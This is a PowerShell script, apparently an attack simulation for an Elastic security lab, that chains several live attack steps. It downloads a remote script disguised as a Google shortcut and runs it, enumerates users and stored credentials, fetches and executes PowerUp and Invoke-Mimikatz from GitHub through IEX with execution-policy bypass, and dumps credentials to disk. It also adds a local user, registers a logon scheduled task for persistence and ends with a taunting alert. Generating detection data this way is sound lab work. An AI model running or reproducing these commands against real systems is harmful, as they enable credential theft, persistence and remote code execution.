# Download a file form URL in email.
Write-Host "[+] Downloading suspicious file from url in email" -ForegroundColor Green
Start-Sleep -S 5
$url = 'https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/Phishing_link.ps1'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile C:\Users\Elastic\AppData\Local\Temp\ubf294ry83.ps1

# Create Lnk File
Write-Host "[+] Creating .lnk file" -ForegroundColor Green
$TargetFile = "C:\Users\Elastic\AppData\Local\Temp\ubf294ry83.ps1"
$shortcutFile = "C:\Users\Elastic\Desktop\Google.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/Google_Chrome_icon-icons.com_66794.ico"
$shortcut.Save()

# Execute file.

Invoke-Item C:\Users\Elastic\Desktop\Google.lnk

Start-Sleep -S 30

# Local user Enumeration

Write-Host "[+] Windows Enumeration" -ForegroundColor Green
net user | Out-File -FilePath "C:\temp\Localenum.txt" -Append
ls c:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
cmdkey.exe /list | Out-File -FilePath "C:\temp\Localenum.txt" -Append
get-localuser | Out-File -FilePath "C:\temp\Localenum.txt" -Append
get-localgroup | Out-File -FilePath "C:\temp\Localenum.txt" -Append
net localgroup "Users" | Out-File -FilePath "C:\temp\Localenum.txt" -Append
net localgroup | Out-File -FilePath "C:\temp\Localenum.txt" -Append
get-localgroupmember -group Users | Out-File -FilePath "C:\temp\Localenum.txt" -Append
get-childitem C:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks | Out-File -FilePath C:\Users\Elastic\AppData\Local\Temp\Powerup.txt"

Start-Sleep -S 5

# Create a new local user

Write-Host "[+] Creating user Ed Snowden" -ForegroundColor Green
net user /add "Ed Snowden" "edsnowdenisthebest"
net localgroup administrators "admin" /add

Start-Sleep -S 15

# create a scheduled task to execute .lnk file 

Write-Host "[+] Creating New Scheduled task" -ForegroundColor Green

$Action = New-ScheduledTaskAction -Execute "C:\Users\Elastic\Desktop\Google.lnk"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask Google_Chrome -InputObject $object

Start-Sleep -S 15

# Mimikatz

Write-Host "[+] Dumping Credentials" -ForegroundColor Green
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds | Out-File -FilePath C:\Users\Elastic\AppData\Local\Temp\Dump.txt

# Alert pop up

Write-Host "[+] Creating Alert" -ForegroundColor Green
Start-Sleep -S 5
Add-Type -AssemblyName System.Windows.Forms
$global:balmsg = New-Object System.Windows.Forms.NotifyIcon
$path = (Get-Process -id $pid).Path
$balmsg.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$balmsg.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Warning
$balmsg.BalloonTipText = ‘THE SECRET OF THE PERFECT HACK?                  MAKE IT INFALLIBLE'
$balmsg.BalloonTipTitle = "Attention $Env:USERNAME"
$balmsg.Visible = $true
$balmsg.ShowBalloonTip(20000)





